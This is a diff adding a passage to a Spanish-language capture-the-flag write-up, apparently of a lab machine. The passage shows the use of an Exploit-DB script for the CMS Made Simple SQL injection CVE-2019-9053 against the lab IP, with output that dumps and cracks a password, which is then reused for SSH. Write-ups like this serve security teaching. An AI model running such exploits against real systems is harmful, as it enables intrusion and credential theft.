@@ -40,3 +40,18 @@ Wappalyzer nos dice directamente que la página usa CMS Made Simple, hay varios 
 Encontramos el endpoint de login pero ademas encontramos una pieza clave, el Copyright es 2004-2019,asi que deben estar en la version de 2019, eso acota bastante la búsqueda de exploits para el servicio
 ### CVE-2019-9053
 Este CVE parece un buen candidato ya que concede acceso sin necesidad de autenticación previa, busquemos un script para explotar esta time based sqli
+```
+https://www.exploit-db.com/exploits/46635
+```
+Lo utilizamos 
+```
+python2.7 46635.py -u http://10.10.10.138 
+[+] Salt for password found: 5a599ef579066807
+[+] Username found: jkr
+[+] Email found: jkr@writeup.htb
+[+] Password found: 62def4866937f08cc13bab43bb14e6f7
+[+] Password cracked: raykayjay9
+```
+La contraseña del CMS tambien vale para el SSH así que were in
+
+## Privesc
